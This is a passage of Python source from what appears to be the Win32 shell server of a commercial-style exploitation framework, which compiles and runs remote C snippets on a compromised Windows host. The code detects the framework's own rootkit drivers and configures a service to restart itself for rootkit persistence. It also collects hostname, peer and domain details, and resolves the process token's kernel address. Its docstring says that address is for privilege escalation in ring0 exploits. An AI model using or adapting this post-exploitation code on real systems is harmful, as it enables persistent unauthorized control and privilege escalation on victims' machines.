        """
        mosdef_file_handle = self.CreateFile("\\\\.\\mosdef",GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0)
        hcn_file_handle    = self.CreateFile("\\\\.\\hcn_dev",GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0)
        ret         = -1

        if mosdef_file_handle != -1 or hcn_file_handle != -1:
            # Rootkit is alive and well
            self.node.capabilities += ["rootkit"]
            self.log("Detected Windows rootkit.")
            self.CloseHandle( mosdef_file_handle )
            self.CloseHandle( hcn_file_handle )
            ret = 1

        return ret

    def ChangeServiceConfig(self, hService, configType ):
        """
        This is here to setup a service with a special
        auto start flag that will ensure this service gets
        started after all other SERVICE_AUTO_START services
        plus a small delay.

        This is to support our rootkit code that requires
        most of the networking drivers to have already started
        before we fire up ours. Otherwise, you end up in an endless
        loop of BSOD's :)
        """

        vars = {}
        vars["hService"]   = hService
        vars["configType"] = configType

        code = """
        #import "remote","advapi32.dll|ChangeServiceConfig2A" as "ChangeServiceConfig"

        #import "local", "sendint" as "sendint"
        #import "int","hService" as "hService"
        #import "int","configType" as "configType"

        struct SERVICE_DELAYED_AUTO_START_INFO{
            int fDelayedAutoStart;
        };

        struct SERVICE_FAILURE_ACTIONS{
            int dwResetPeriod;
            char* lpRebootMsg;
            char* lpCommand;
            int cActions;
            int lpsaActions;
        };

        struct SERVICE_FAILURE_ACTIONS_FLAG{
            int fFailureActionsOnNonCrashFailures;
        };

        void main()
        {
          int ret;
          struct SERVICE_DELAYED_AUTO_START_INFO ServiceDelay;
          struct SERVICE_FAILURE_ACTIONS ServiceFailureActions;
          struct SERVICE_FAILURE_ACTIONS_FLAG ServiceFailureActionsFlag;

          if(configType == 1)
          {

            ServiceDelay.fDelayedAutoStart = 1;
            ret = ChangeServiceConfig( hService, 0x3, &ServiceDelay );
          }

          if(configType == 2)
          {
             ServiceFailureActionsFlag.fFailureActionsOnNonCrashFailures = 1;
             ret = ChangeServiceConfig( hService, 0x4, &ServiceFailureActionsFlag );

             if( ret != 0 )
             {
               ServiceFailureActions.dwResetPeriod = 20;
               ServiceFailureActions.lpRebootMsg = NULL;
               ServiceFailureActions.lpCommand = "net start MosdefUserMode";
               ServiceFailureActions.cActions = 0;
               ServiceFailureActions.lpsaActions = NULL;

               ret = ChangeServiceConfig( hService, 0x2, &ServiceFailureActions );

            }

          }

          if(ret == 0)
          {
            sendint(-1);
          }else{
            sendint(ret);
          }
          return;
        }
        """
        self.clearfunctioncache()
        request = self.compile(code,vars)
        self.sendrequest(request)
        ret = self.readint()
        self.leave()

        return ret


    def getpeername(self):
        """
        Call getpeername() on connected node and return tuple with IP, PORT
        Return None on error.
        """

        vars = {
            'FD' : self.fd,
        }

        code = """
        #import "local"  , "sendint" as "sendint"
        #import "remote" , "ws2_32.dll|getpeername" as "getpeername"
        #import "int"    , "FD" as "FD"

        struct sockaddr_in {
            unsigned short int family;
            unsigned short int port;
            unsigned int saddr;
            char pad[8];
        };

        void main()
        {
            int ret;
            struct sockaddr_in addr;
            int size;
            int port;

            size = 16;
            port = 0;
            ret = getpeername(FD, &addr, &size);
            port = addr.port;

            sendint(ret);

            if (ret == 0) {
                sendint(port);
                sendint(addr.saddr);
            }
        }
        """

        self.clearfunctioncache()
        request = self.compile(code, vars)
        self.sendrequest(request)
        ret = self.readint()

        if ret == 0:
            port = socket.ntohs(self.readint())
            ip   = '.'.join(map(str, (map(ord, self.reliableread(4)))))
            self.leave()
            return (ip, port)

        self.leave()
        return None


    def gethostname(self):
        """
        Call gethostname() on connected node and return hostname string.
        Return None on error.
        """

        code = """
        #import "local",  "sendstring" as "sendstring"
        #import "remote", "ws2_32.dll|gethostname"   as "gethostname"

        void main()
        {
            int ret;
            char hostname[256];

            ret = gethostname(&hostname, 256);
            sendint(ret);

            if (ret == 0) {
                sendstring(hostname);
            }
        }
        """

        self.clearfunctioncache()
        request = self.compile(code, {})
        self.sendrequest(request)
        ret = self.readint()

        if ret == 0:
            ret = self.readstring()
        else:
            ret = None

        self.leave()
        return ret


    def getdomain(self):
        """
        Calls DsRoleGetPrimaryDomainInformation() on connected node and returns
        a dictionary filled with the content of a DSROLE_PRIMARY_DOMAIN_INFO_BASIC
        structure if the call succeeds.
        Return None on error.
        """

        code = """
        #import "local",  "senddata2self" as "senddata2self"
        #import "local",  "sendunistring2self" as "sendunistring2self"
        #import "remote", "netapi32.dll|DsRoleGetPrimaryDomainInformation" as "DsRoleGetPrimaryDomainInformation"

        void main()
        {
            int ret;
            char *Buffer;
            unsigned int *ptr;

            Buffer = 0;
            ptr = 0;
            ret = DsRoleGetPrimaryDomainInformation(NULL, 1, &Buffer);
            sendint(ret);

            if (ret == 0) {
                senddata2self(Buffer, 36);
                ptr = Buffer;
                ptr = ptr + 2;
                sendunistring2self(*ptr);
                ptr = ptr + 1;
                sendunistring2self(*ptr);
                ptr = ptr + 1;
                sendunistring2self(*ptr);
            }

        }
        """

        self.clearfunctioncache()
        request = self.compile(code, {})
        self.sendrequest(request)
        ret = self.readint()

        if ret == 0:

            try:
                ret = {}
                dsrole_buffer = self.readblock()
                MachineRole,Flags = struct.unpack('<LL', dsrole_buffer[:8])
                DomainNameFlat = self.readblock().decode('UTF-16LE')
                DomainNameDns = self.readblock().decode('UTF-16LE')
                DomainForestName = self.readblock().decode('UTF-16LE')
                ret['MachineRole'] = MachineRole
                ret['Flags'] = Flags
                ret['DomainNameFlat'] = DomainNameFlat
                ret['DomainNameDns'] = DomainNameDns
                ret['DomainForestName'] = DomainForestName
            except Exception as e:
                ret = None

        else:
            ret = None

        self.leave()
        return ret


    def get_process_token_ring0_address(self):
        """
        This is a helper function if you have arbitrary writes
        in ring0 on Windows this will resolve the current process
        TOKEN address so you can set TOKEN privileges.

        We simply read in the buffer needed to retrieve all of the handle
        information and use pure Python to cast to the proper structs.

        It returns the kernel address so you can use it in your exploit.
        """

        code = """
        #import "local",  "sendint" as "sendint"
        #import "local",  "writeblock2self" as "writeblock2self"
        #import "remote", "ntdll.dll|NtQuerySystemInformation" as "NtQuerySystemInformation"
        #import "remote", "kernel32.dll|LocalAlloc" as "LocalAlloc"
        #import "remote", "kernel32.dll|LocalFree" as "LocalFree"

        #define LPTR 0x0040 // LMEM_FIXED|LMEM_ZEROINIT

        void main()
        {
            int system_handle_size;
            int status;
            char* handle_buf;
            int bytes_needed;

            system_handle_size = 0x30000;
            handle_buf = LocalAlloc(LPTR, system_handle_size);

            if (handle_buf == 0) {
                sendint(-1);
                return;
            }

            status = NtQuerySystemInformation(16, handle_buf, system_handle_size, &bytes_needed );

            if(status != 0)
            {
                while(status < 0)
                {
                    LocalFree(handle_buf);
                    system_handle_size = bytes_needed * 2;
                    handle_buf = LocalAlloc(LPTR, system_handle_size);

                    if (handle_buf == 0) {
                        sendint(-1);
                        return;
                    }
                    status = NtQuerySystemInformation(16, handle_buf, system_handle_size, &bytes_needed);
                }
            }

            if (status != 0) {
                sendint(0);
                sendint(status);
            } else {
                sendint(bytes_needed);
                writeblock2self(handle_buf,bytes_needed);
                LocalFree(handle_buf);
              }
            }
        """

        # get our process ID to match against handle.ProcessId
        pid = self.getpid()

        # grab the current process token
        h_token = self.openprocesstoken()
        # self.log("[+] Our Token: %08x" % h_token)

        # retrieve buffer of SYSTEM_HANDLES
        self.clearfunctioncache()
        request=self.compile(code,{})
        self.sendrequest(request)

        # receive the buffer size
        buf_size = self.readint(signed=True)

        if buf_size == -1:
            self.log('[EE] Could not allocate memory with LocalAlloc()')
            self.leave()
            return -1

        if buf_size == 0:
            self.log("%08x" % self.readint(signed=True))
            self.log('[EE] Failed to receive SYSTEM_HANDLE information.')
            self.leave()
            return -1

        # self.log("Reading %d bytes from remote." % buf_size)
        system_handle_buffer = self.readbuf(buf_size)
        self.leave()

        # Now we find how many handles are available.
        handle_count = struct.unpack("<L",system_handle_buffer[0:4])[0]

        count = 0
        kernel_address = -1

        # iterate over all handles in all processes looking for our newly
        # opened token handle
        while count < handle_count:
            handle_index = 4 + (count * 16)
            system_handle = system_handle_buffer[handle_index:handle_index + 16]

            target_pid    = struct.unpack("<L",system_handle[0:4])[0]
            target_handle = struct.unpack("<h",system_handle[6:8])[0]

            if target_pid == pid and target_handle == h_token:
                self.CloseHandle(h_token)
                kernel_address = struct.unpack("<L",system_handle[8:12])[0]
                break

            count += 1

        return kernel_address

win32shellserver = MosdefShellServer('Win32', 'x86')
